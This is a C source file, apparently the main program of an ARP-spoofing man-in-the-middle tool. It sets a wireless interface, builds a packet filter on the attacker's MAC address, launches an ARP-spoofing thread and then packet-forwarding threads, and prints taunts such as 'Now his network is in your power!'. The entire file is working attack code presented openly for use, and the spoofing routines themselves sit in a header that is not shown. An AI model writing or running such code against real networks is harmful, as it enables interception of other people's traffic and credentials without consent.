#include "head.h"

int main(int argc, char const *argv[]) {

    /* device */
    char *device = "wlp1s0";
    
    /* build info */
    MITM_info MITM_arg;
    Getinfo(&MITM_arg);
    MITM_arg.dev = device;
    char filter_app[50] = "ip and ether dst ";
    char mymac[50];
    sprintf(mymac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", MITM_arg.ATTACKER_MAC[0], MITM_arg.ATTACKER_MAC[1],
    MITM_arg.ATTACKER_MAC[2], MITM_arg.ATTACKER_MAC[3], MITM_arg.ATTACKER_MAC[4], MITM_arg.ATTACKER_MAC[5]);
    strcat(filter_app, mymac);
    MITM_arg.filter = filter_app;
    
    /* multiplythreading */
    pthread_t thread1, thread2, thread3, thread4, thread5, thread6, thread7, thread8;
    int ret_thread1, ret_thread2, ret_thread3, ret_thread4, ret_thread5, ret_thread6, ret_thread7, ret_thread8;

    /* arpspoof */
    printf("ATTACK!\n");    
    ret_thread1 = pthread_create(&thread1, NULL, (void *)&Arpspoof, (void *)&MITM_arg);
    
    /* forward */
    sleep(5);
    printf("Now his network is in your power!\n");
    ret_thread2 = pthread_create(&thread2, NULL, (void *)&forward_packet, (void *)&MITM_arg);
    ret_thread3 = pthread_create(&thread3, NULL, (void *)&forward_packet, (void *)&MITM_arg);

    /* before end */
    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);
    pthread_join(thread3, NULL);
    return 0;
}